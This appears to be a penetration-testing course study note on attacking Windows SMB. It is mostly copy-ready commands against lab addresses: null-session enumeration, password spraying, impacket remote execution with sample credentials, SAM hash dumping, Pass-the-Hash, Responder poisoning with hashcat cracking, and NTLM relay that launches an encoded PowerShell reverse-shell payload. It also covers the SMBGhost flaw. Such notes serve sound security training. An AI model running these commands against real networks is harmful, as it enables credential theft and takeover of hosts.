---
tags: [attack, enumeration/smb, attack/network]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 2
---

# Attacking SMB

Exploitation techniques for SMB: null sessions, password spraying, remote code execution, credential dumping, Pass-the-Hash, LLMNR poisoning, NTLM relay, and CVE-2020-0796.

## Overview

SMB (TCP/445) is one of the highest-value targets in Windows environments. It provides file share access, authentication via NTLM/Kerberos, and remote execution capabilities. Even a null session can enumerate users and shares that enable further attacks.

See [[enumeration/smb]] for pre-attack fingerprinting and share/user enumeration.

## Null sessions and brute force

```bash
# Anonymous share listing
smbclient -N -L //10.129.14.128

# Map shares with access flags
smbmap -H 10.129.14.128

# Null-session user/group enum
enum4linux-ng -A 10.129.14.128

# Brute-force a user list
crackmapexec smb 10.129.14.128 --local-auth -u brute_users.txt -p passwords.txt --continue-on-success
```

## Password spraying with CrackMapExec

```bash
# Domain-joined hosts
crackmapexec smb 10.129.14.128 -u users.txt -p passwords.txt --continue-on-success

# Local accounts
crackmapexec smb 10.129.14.128 --local-auth -u users.txt -p passwords.txt

# Look for (Pwn3d!) in output — indicates local admin
```

`--continue-on-success` prevents stopping at first hit and is essential when spraying.

## Remote code execution

With admin credentials, several impacket tools provide a shell:

```bash
# PsExec — creates a service binary on the share (noisiest, most reliable)
impacket-psexec administrator:'HTBRocks!'@10.129.14.128

# SMBExec — service-based but executes via cmd.exe (less cleanup needed)
impacket-smbexec administrator:'HTBRocks!'@10.129.14.128

# ATExec — runs a single command via Task Scheduler (no interactive shell)
impacket-atexec administrator:'HTBRocks!'@10.129.14.128 'whoami'

# CrackMapExec command execution
crackmapexec smb 10.129.14.128 -u administrator -p 'HTBRocks!' -x 'whoami'
```

| Tool | Method | Interactivity | Noise |
|------|--------|---------------|-------|
| psexec | service binary | interactive | high |
| smbexec | cmd service | interactive | medium |
| atexec | task scheduler | single command | low |
| CME `-x` | cmd service | single command | medium |

## SAM database dump

If you have admin credentials, dump the local SAM:

```bash
crackmapexec smb 10.129.14.128 --local-auth -u administrator -p 'HTBRocks!' --sam
```

Output includes NTLM hashes for all local accounts. Use these for Pass-the-Hash.

## Pass-the-Hash (PTH)

With an NT hash from SAM dump or secretsdump:

```bash
# CrackMapExec PTH
crackmapexec smb 10.129.14.128 -u administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# impacket-psexec PTH (hash format: LM:NT)
impacket-psexec administrator@10.129.14.128 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# xfreerdp PTH (requires Restricted Admin Mode enabled)
xfreerdp /v:10.129.14.128 /u:administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

## LLMNR/NBT-NS poisoning with Responder

When a Windows host fails to resolve a name via DNS, it broadcasts LLMNR/NBT-NS queries. Responder answers these and captures NTLMv2 hashes.

```bash
sudo responder -I tun0
```

Wait for a machine on the network to attempt a failed name resolution (e.g., typo'd share path). Responder captures:

```
[SMB] NTLMv2-SSP Hash: user::DOMAIN:challenge:response:blob
```

Crack with Hashcat mode 5600:

```bash
hashcat -a 0 -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

## NTLM relay with impacket

Instead of cracking the hash, relay it to another host where the user has admin rights.

```bash
# Disable SMB and HTTP on Responder so it doesn't respond (relay tool handles auth)
sudo responder -I tun0 --lm

# Run the relay in another terminal — relay to target where victim has local admin
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 10.129.14.130

# If target has local admin, relay dumps SAM automatically
# Or land a reverse shell
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 10.129.14.130 \
  -c "powershell -e <base64_payload>"
```

Requirements: victim must authenticate to your host and must have admin on the relay target. SMB signing must be disabled on the relay target.

## CVE-2020-0796 — SMBGhost

Integer overflow in SMBv3.1.1 compression (Windows 10 1903/1909) allowing unauthenticated RCE. The compression mechanism fails to validate bounds, enabling overwrite of kernel memory with attacker-controlled data.

- Exploit: [ExploitDB 48537](https://www.exploit-db.com/exploits/48537)
- Fix: KB4551762 (March 2020 out-of-band patch)
- Risk: Can cause BSoD — test with client consent

Check version exposure:

```bash
nmap -p445 --script smb-protocols 10.129.14.128
```

## Gotchas & notes

- PTH requires the account to have non-empty NT hash; blank passwords (`aad3b435b51404eeaad3b435b51404ee`) won't work with some tools
- Responder poisons the entire broadcast domain — coordinate with client to avoid disrupting production
- NTLM relay does NOT work if SMB signing is enforced (default on DCs)
- atexec creates and deletes scheduled tasks; check for residual entries if cleanup is needed

## Related pages

- [[enumeration/smb]]
- [[tools/crackmapexec]]
- [[tools/impacket]]
- [[tools/smbclient]]
- [[tools/enum4linux]]
- [[tools/responder]]
- [[attack/rdp]] — PTH applies to RDP too
- [[attack/sql_databases]] — MSSQL can also steal NTLMv2 hashes via xp_dirtree

## Sources

- raw/attacking_common_services/smb_attacking_smb.md
- raw/attacking_common_services/smb_latest_smb_vulnerabilities.md
